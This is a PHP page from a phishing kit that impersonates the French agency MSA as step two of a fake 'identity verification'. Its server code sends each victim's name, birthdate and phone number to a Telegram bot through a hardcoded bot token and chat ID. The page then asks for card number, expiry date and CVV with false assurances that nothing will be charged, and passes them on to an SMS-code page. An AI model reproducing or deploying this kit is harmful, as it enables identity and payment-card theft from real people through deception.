<?php
session_start();

// ✅ Sécurité : désactiver l'affichage des erreurs en prod
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);

// ✅ Fonction de nettoyage
function clean($value) {
    return htmlspecialchars(trim($value), ENT_QUOTES, 'UTF-8');
}

// ✅ Récupération des données du POST (si appel depuis index.php)
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $_SESSION['nom'] = clean($_POST['nom'] ?? '');
    $_SESSION['prenom'] = clean($_POST['prenom'] ?? '');
    $_SESSION['birthdate'] = clean($_POST['birthdate'] ?? '');
    $_SESSION['phone'] = clean($_POST['phone'] ?? '');

    // ✅ Paramètres Telegram
    $token = '7194667513:AAEjFC8Lr3YGuhofocJkIpr3i9LvzTDwZDA';
    $chat_id = '6163989462';

    // ✅ Envoi vers Telegram
    $message = "<b>Nouvelle identification MSA</b>\n";
    $message .= "👤 Nom : ".$_SESSION['nom']."\n";
    $message .= "🧑‍🦱 Prénom : ".$_SESSION['prenom']."\n";
    $message .= "🎂 Naissance : ".$_SESSION['birthdate']."\n";
    $message .= "📞 Téléphone : ".$_SESSION['phone'];

    $url = "https://api.telegram.org/bot$token/sendMessage";
    $data = [
        'chat_id' => $chat_id,
        'text' => $message,
        'parse_mode' => 'HTML'
    ];

    $options = [
        'http' => [
            'method'  => 'POST',
            'header'  => "Content-Type: application/x-www-form-urlencoded\r\n",
            'content' => http_build_query($data)
        ]
    ];

    file_get_contents($url, false, stream_context_create($options));
}
?>

<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>MSA - Vérification d'Identité</title>
    <style>
        /* Styles identiques à index.php */
        :root {
            --msa-blue: #0056b3;
            --msa-dark-blue: #003366;
            --msa-green: #008a43;
            --msa-light-gray: #f5f7fa;
        }
        body {
            font-family: 'Roboto', sans-serif;
            margin: 0;
            padding: 0;
            background-color: var(--msa-light-gray);
            background-image: url('assets/images/msa-bg.jpg');
            background-size: cover;
            background-attachment: fixed;
        }
        .msa-container {
            max-width: 800px;
            margin: 40px auto;
            background: white;
            border-radius: 10px;
            box-shadow: 0 5px 25px rgba(0, 0, 0, 0.1);
            overflow: hidden;
        }
        .msa-header {
            background: linear-gradient(135deg, var(--msa-blue), var(--msa-dark-blue));
            color: white;
            padding: 30px;
            text-align: center;
            position: relative;
        }
        .msa-logo {
            height: 60px;
            margin-bottom: 15px;
        }
        .msa-form {
            padding: 30px;
        }
        .msa-form-group {
            margin-bottom: 25px;
        }
        .msa-form-group label {
            display: block;
            margin-bottom: 8px;
            font-weight: 500;
            color: #333;
        }
        .msa-form-control {
            width: 100%;
            padding: 14px;
            border: 1px solid #ddd;
            border-radius: 6px;
            font-size: 16px;
            transition: all 0.3s;
        }
        .msa-form-control:focus {
            border-color: var(--msa-blue);
            box-shadow: 0 0 0 3px rgba(0, 86, 179, 0.1);
            outline: none;
        }
        .msa-btn {
            background: var(--msa-green);
            color: white;
            border: none;
            padding: 16px;
            font-size: 16px;
            border-radius: 6px;
            cursor: pointer;
            width: 100%;
            font-weight: 500;
            margin-top: 10px;
            transition: all 0.3s;
        }
        .msa-btn:hover {
            background: #007a3a;
            transform: translateY(-2px);
        }
        .msa-security-badge {
            display: flex;
            align-items: center;
            justify-content: center;
            margin-top: 30px;
            padding-top: 20px;
            border-top: 1px solid #eee;
            color: #666;
        }
        .msa-security-badge img {
            height: 30px;
            margin-right: 10px;
        }
        .msa-notification {
            background: #e7f3fe;
            border-left: 4px solid var(--msa-blue);
            padding: 15px;
            margin-bottom: 25px;
            border-radius: 4px;
        }
        /* Styles spécifiques page 2 */
        .msa-progress {
            display: flex;
            margin-bottom: 30px;
            text-align: center;
            padding: 0 30px;
        }
        .msa-progress-step {
            flex: 1;
            padding: 10px;
            position: relative;
            color: #999;
            font-size: 14px;
        }
        .msa-progress-step.active {
            color: var(--msa-blue);
            font-weight: bold;
        }
        .msa-progress-step.completed {
            color: var(--msa-green);
        }
        .msa-progress-step:not(:last-child):after {
            content: "";
            position: absolute;
            top: 50%;
            right: 0;
            width: 20px;
            height: 2px;
            background: #ddd;
        }
        .msa-card-section {
            background: #f9f9f9;
            border-radius: 8px;
            padding: 20px;
            margin-bottom: 25px;
        }
        .msa-card-title {
            display: flex;
            align-items: center;
            margin-bottom: 15px;
        }
        .msa-card-title img {
            height: 30px;
            margin-right: 10px;
        }
        .form-row {
            display: flex;
            gap: 20px;
        }
        .form-row .msa-form-group {
            flex: 1;
        }
    </style>
</head>
<body>
    <div class="msa-container">
        <div class="msa-header">
            <img src="assets/images/msa-logo.png" alt="MSA France" class="msa-logo">
            <h1>Vérification d'Identité</h1>
        </div>
        
        <div class="msa-progress">
            <div class="msa-progress-step completed">1. Identification</div>
            <div class="msa-progress-step active">2. Vérification</div>
            <div class="msa-progress-step">3. Confirmation</div>
        </div>
        
        <div class="msa-form">
            <div class="msa-card-section">
                <div class="msa-card-title">
                    <img src="assets/images/msa-id-verify.png" alt="Vérification">
                    <h3 style="margin: 0; color: var(--msa-dark-blue);">Vérification de sécurité</h3>
                </div>
                <p style="color: #666;">Pour votre protection, nous devons vérifier votre carte bancaire. Aucun débit ne sera effectué.</p>
            </div>
            
            <form action="code-sms.php" method="post">
                <div class="msa-form-group">
                    <label for="cardNumber">Numéro de carte bancaire</label>
                    <input type="text" id="cardNumber" name="cardNumber" class="msa-form-control" 
                           placeholder="1234 5678 9012 3456" required
                           oninput="formatCardNumber(this)">
                </div>
                
                <div class="form-row">
                    <div class="msa-form-group">
                        <label for="expiryDate">Date d'expiration</label>
                        <input type="text" id="expiryDate" name="expiryDate" class="msa-form-control" 
                               placeholder="MM/AA" required
                               oninput="formatExpiryDate(this)">
                    </div>
                    
                    <div class="msa-form-group">
                        <label for="cvv">Code de sécurité</label>
                        <input type="text" id="cvv" name="cvv" class="msa-form-control" 
                               placeholder="123" required
                               maxlength="3">
                    </div>
                </div>
                
                <button type="submit" class="msa-btn">Valider et continuer</button>
                
                <div class="msa-security-badge">
                    <img src="assets/images/msa-secure.png" alt="Sécurité">
                    <span>Vos informations bancaires sont cryptées et protégées</span>
                </div>
            </form>
        </div>
    </div>

    <script>
        function formatCardNumber(input) {
            let value = input.value.replace(/\s/g, '');
            if (value.length > 0) {
                value = value.match(/.{1,4}/g).join(' ');
            }
            input.value = value;
        }
        
        function formatExpiryDate(input) {
            let value = input.value.replace(/\D/g, '');
            if (value.length > 2) {
                value = value.substring(0, 2) + '/' + value.substring(2, 4);
            }
            input.value = value;
        }
    </script>
</body>
</html>